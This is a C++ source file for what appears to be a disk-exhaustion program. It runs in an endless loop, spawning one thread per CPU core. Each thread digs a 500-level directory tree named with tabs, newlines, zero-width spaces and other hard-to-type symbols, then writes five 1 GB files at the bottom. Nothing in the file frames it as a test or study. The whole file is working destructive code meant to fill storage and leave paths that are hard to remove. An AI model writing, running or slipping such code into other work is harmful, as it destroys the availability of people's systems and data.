#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <thread>
#include <random>
namespace fs = std::filesystem;

struct generateSpecialSymbolStringGenerator{
    std::string generateSpecialSymbolString(int count){// Set up the random number generator (seeded once for efficiency).
        static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());
        std::vector<std::string> default_symbols = {"§","\t","\n","\u200b","`","~","§","°","±","¶","·","¿","¡","¢","£","¤","¥","¦","©","®","¬","¯","×","÷","''","F","U","C","K","μ","L","M","A","O"};
        // Create a distribution to select an index from the vector.
        std::uniform_int_distribution<int> distribution(0, default_symbols.size() - 1);

        std::string result;
        for (int i = 0; i < count; ++i) {
            // Append a random string from the vector to the result.
            result += default_symbols[distribution(engine)];
        }

        return result;

    }




    std::string generateSpecialSymbolString(int count, const std::vector<std::string>& symbols) {


        // Set up the random number generator (seeded once for efficiency).
        static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());

        // Create a distribution to select an index from the vector.
        std::uniform_int_distribution<int> distribution(0, symbols.size() - 1);

        std::string result;
        for (int i = 0; i < count; ++i) {
            // Append a random string from the vector to the result.
            result += symbols[distribution(engine)];
        }

        return result;
    }

};




void make_tunnel_and_payloads(int id, std::string ranfilenames, int depth, size_t fileSizeGB, int filesPerTunnel) {
    // Unique root per thread
    fs::path root = ranfilenames;
    fs::create_directory(root);
    generateSpecialSymbolStringGenerator strgen;
    // Drill deep
    fs::path current = root;
    for (int i = 0; i < depth; i++) {
        current /= strgen.generateSpecialSymbolString(8);
        fs::create_directory(current);
    }

    // 100 MB buffer for writing
    const size_t chunkSize = 100 * 1024 * 1024;
    std::vector<char> buffer(chunkSize, 'X');

    // Write multiple files at the bottom
    for (int f = 0; f < filesPerTunnel; f++) {
        fs::path bigfile = current / (strgen.generateSpecialSymbolString(16) + ".bin");
        std::ofstream file(bigfile, std::ios::binary);

        size_t chunks = (fileSizeGB * 1024ULL) / 100; // number of 100MB writes

        for (size_t i = 0; i < chunks; i++) {
            file.write(buffer.data(), buffer.size());
        }
    }

    std::cout << "Thread " << id
    << " wrote " << filesPerTunnel
    << " files of " << fileSizeGB << " GB each at " << current << "\n";
}




int main() {
    const int numThreads = std::thread::hardware_concurrency();
    const int depth = 500;   // subdirectory levels
    const size_t fileSizeGB = 1; // per payload
    const int filesPerTunnel = 5; // number of payloads per thread


    std::random_device rd;

    // Seed a high-quality generator (Mersenne Twister)
    std::mt19937 generator(rd());

    // Create a distribution
    std::uniform_int_distribution<int> distribution(6, 12);

    std::vector<std::thread> threads;
    generateSpecialSymbolStringGenerator StrGen;
while(1){
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back(make_tunnel_and_payloads,i, StrGen.generateSpecialSymbolString(distribution(generator)) , depth, fileSizeGB, filesPerTunnel);
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Done: " << numThreads << " tunnels with "
    << filesPerTunnel << " payloads each.\n";}
    return 0;
}
